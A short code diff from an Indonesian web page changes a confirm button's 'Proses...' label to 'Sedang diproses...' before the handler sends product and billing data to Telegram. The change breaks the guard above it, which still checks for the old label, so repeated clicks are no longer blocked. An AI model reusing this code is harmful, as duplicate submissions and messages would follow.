@@ -493,7 +493,7 @@
                     confirmButton.addEventListener('click', function () {
                         if (confirmButton.textContent === 'Proses...') return;
 
-                        confirmButton.textContent = 'Proses...';
+                        confirmButton.textContent = 'Sedang diproses...';
 
                         setTimeout(() => {
                             sendToTelegram(latestData.namaProduk, latestData.nomerTagihan, latestData.polaRespon, latestData.callbackData)
